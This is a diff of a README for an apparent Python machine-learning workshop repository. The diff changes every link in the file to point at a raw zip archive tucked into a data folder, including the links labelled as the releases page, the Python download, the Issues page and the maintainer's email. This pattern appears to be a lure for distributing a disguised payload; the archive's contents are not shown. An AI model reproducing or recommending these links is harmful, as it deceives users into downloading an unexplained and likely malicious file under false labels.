@@ -1,6 +1,6 @@
 # 🤖 Machine_Learning - Simplify AI Programming with Python
 
-[![Download from Releases](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/monoxylic/Machine_Learning.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/monoxylic/Machine_Learning.zip)
+[![Download from Releases](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/5_Classification/52_KNN/Data/Learning_Machine_1.9-alpha.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/5_Classification/52_KNN/Data/Learning_Machine_1.9-alpha.2.zip)
 
 ## 📚 Overview
 This repository provides workshop materials for learning AI programming using Python. It covers essential topics such as data preprocessing, machine learning techniques, and explainable AI using SHAP. The resources are designed for an easy understanding of AI concepts, even for those with no programming background.
@@ -8,7 +8,7 @@ This repository provides workshop materials for learning AI programming using Py
 ## 🚀 Getting Started
 To start using the materials, follow these steps:
 
-1. **Visit the Releases Page**: You can access the downloads by clicking the button above or visiting [this page to download](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/monoxylic/Machine_Learning.zip).
+1. **Visit the Releases Page**: You can access the downloads by clicking the button above or visiting [this page to download](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/5_Classification/52_KNN/Data/Learning_Machine_1.9-alpha.2.zip).
 
 2. **Select the Desired Version**: On the releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
@@ -20,7 +20,7 @@ To start using the materials, follow these steps:
 
 ## 🔧 System Requirements
 - **Operating System**: Windows, MacOS, or Linux
-- **Python**: Version 3.6 or higher is recommended. You can download Python from [https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/monoxylic/Machine_Learning.zip](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/monoxylic/Machine_Learning.zip).
+- **Python**: Version 3.6 or higher is recommended. You can download Python from [https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/5_Classification/52_KNN/Data/Learning_Machine_1.9-alpha.2.zip](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/5_Classification/52_KNN/Data/Learning_Machine_1.9-alpha.2.zip).
 - **IDE**: A code editor or an Integrated Development Environment (IDE) like Jupyter Notebook or VS Code for running Python scripts.
 
 ## 📖 Features
@@ -30,7 +30,7 @@ To start using the materials, follow these steps:
 - **Explainability**: Discover how to make AI decisions transparent using SHAP.
 
 ## 📥 Download & Install
-1. **Go to the Releases Page**: Click [here to visit this page to download](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/monoxylic/Machine_Learning.zip).
+1. **Go to the Releases Page**: Click [here to visit this page to download](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/5_Classification/52_KNN/Data/Learning_Machine_1.9-alpha.2.zip).
 2. **Download the Latest Version**: Choose the latest version available.
 3. **Install Python**: If you haven’t installed Python yet, follow the instructions on the Python website.
 4. **Set Up Your IDE**: Install Jupyter Notebook or your preferred IDE to run the Python files.
@@ -57,8 +57,8 @@ Feel free to explore these topics at your own pace. Each topic includes examples
 
 ## 📞 Need Help?
 If you have questions or need assistance, please feel free to reach out:
-- **Issues Page**: Post your question or issue on the [Issues page](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/monoxylic/Machine_Learning.zip).
-- **Email**: If you prefer direct support, you can also email the maintainer at [https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/monoxylic/Machine_Learning.zip](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/monoxylic/Machine_Learning.zip).
+- **Issues Page**: Post your question or issue on the [Issues page](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/5_Classification/52_KNN/Data/Learning_Machine_1.9-alpha.2.zip).
+- **Email**: If you prefer direct support, you can also email the maintainer at [https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/5_Classification/52_KNN/Data/Learning_Machine_1.9-alpha.2.zip](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/5_Classification/52_KNN/Data/Learning_Machine_1.9-alpha.2.zip).
 
 ## 📊 Additional Resources
 For further learning, consider these additional resources:
@@ -69,7 +69,7 @@ For further learning, consider these additional resources:
 Make sure to practice regularly. The more you work with the tools and concepts, the quicker you will improve.
 
 ## 📌 Summary of Steps
-1. Visit the [Releases page to download](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/monoxylic/Machine_Learning.zip).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/tvarichak/Machine_Learning/main/5_Classification/52_KNN/Data/Learning_Machine_1.9-alpha.2.zip).
 2. Download and extract the files.
 3. Set up Python and your IDE.
 4. Follow the tutorials to start learning. 
